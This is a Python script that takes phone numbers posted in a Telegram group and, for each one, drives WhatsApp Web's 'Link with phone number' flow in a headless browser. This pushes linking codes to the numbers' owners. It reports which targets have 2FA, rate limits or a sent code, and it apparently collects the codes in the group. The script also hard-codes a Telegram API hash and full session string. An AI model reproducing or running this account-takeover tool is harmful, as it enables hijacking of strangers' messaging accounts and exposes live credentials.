import asyncio
import re
import os
from flask import Flask
from threading import Thread
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from playwright.async_api import async_playwright

app = Flask('')
@app.route('/')
def home(): return "Bot is Active - India Mode"

def keep_alive():
    port = int(os.environ.get("PORT", 10000))
    Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()

# --- CONFIG ---
API_ID = 31177437
API_HASH = '2edea950fe232f2e0ba6febfcd036452'
SESSION_STR = '1BVtsOMIBu29KyU3npaBUEiwW_M1Mem4iKHV6kCENAw5OepzMGecUxHo5RdGmA9e_Pr2pQPbKlL8_McBe0JAnN5Hts1pHKeGZmV40oBZ6MKu5g-7xuJx1epZZWqN--W-l35ujcq3tl9pb_vALtAotdtNhvgwdgIcty8plWZkTrvS_ru1CQ5MUf_eTP9brXJfwOyn1vC92WVZSGWwApnWtlKX4mmEBEN3GXHUuCyPjp07RdgwadimysqHw-GoIENCdUIoHUkDepofk374gwGGnS4-YYBW81lv53-Pn6wLdi4hE3gxBNOMz29fVjlVa2cDgAvQSnCYsxCD8QqdBkh_VIyIRpeRaOCw='
GROUP_ID = -1003211737650 
TARGET_NAME = "Test Guy"

processed_numbers = set()

async def try_login(page, client, phone):
    # India (+91) Formatting
    if not phone.startswith('+91'):
        if len(phone) == 10: phone = '+91' + phone
        elif len(phone) == 12 and phone.startswith('91'): phone = '+' + phone
        else: return

    if phone in processed_numbers: return
    processed_numbers.add(phone)
    
    await client.send_message('me', f"🔍 **SCANNING INDIA NUMBER**\nTarget: `{phone}`")
    try:
        # Timeout 100s for slow Render network
        await page.goto("https://web.whatsapp.com/", timeout=100000)
        await asyncio.sleep(12) 
        
        link_selector = "text='Link with phone number'"
        await page.wait_for_selector(link_selector, timeout=60000)
        await page.click(link_selector)
        
        await asyncio.sleep(5)
        await page.fill('input[aria-label="Type your phone number."]', phone)
        await page.keyboard.press("Enter")
        await asyncio.sleep(8)

        # DETAILED ERROR DETECTION
        content = (await page.content()).lower()
        if "is too short" in content or "invalid" in content:
            reason = "❌ WRONG NUMBER (Digit kam/zyada hain)"
        elif "try again in" in content or "too many times" in content:
            reason = "🚫 OTP LIMIT (Wait for 24 hours)"
        elif "two-step verification" in content or "2-step" in content:
            reason = "🔒 2FA ENABLED (Security code laga hai)"
        else:
            reason = "📩 OTP SENT (Check group for code)"
            await client.send_message('me', f"✅ **STATUS**: {reason}\nNumber: `{phone}`")
            return

        await client.send_message('me', f"⚠️ **LOGIN FAILED**\nNumber: `{phone}`\nReason: {reason}")

    except Exception as e:
        error_msg = str(e)
        if "Timeout" in error_msg:
            r = "Slow Internet/WhatsApp Load Failed"
        elif "Executable" in error_msg:
            r = "Browser Missing (Check Dockerfile)"
        else:
            r = error_msg[:100]
        await client.send_message('me', f"❌ **SYSTEM ERROR**\nNumber: `{phone}`\nReason: {r}")

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"])
        context = await browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36")
        page = await context.new_page()
        
        client = TelegramClient(StringSession(SESSION_STR), API_ID, API_HASH)
        await client.start()

        # SCAN LAST 10 INDIA NUMBERS
        history_count = 0
        async for msg in client.iter_messages(GROUP_ID, limit=500):
            if history_count >= 10: break
            if msg.text:
                num_match = re.search(r'\+?\d{10,15}', msg.text)
                if num_match:
                    found_num = num_match.group()
                    if found_num.endswith('11592') or found_num.endswith('00251'): # For testing
                        pass 
                    await try_login(page, client, found_num)
                    history_count += 1
                    await asyncio.sleep(15)

        @client.on(events.NewMessage(chats=GROUP_ID))
        async def handler(event):
            num_match = re.search(r'\+?\d{10,15}', event.raw_text)
            if num_match:
                await try_login(page, client, num_match.group())

        await client.run_until_disconnected()

if __name__ == "__main__":
    keep_alive()
    asyncio.run(main())
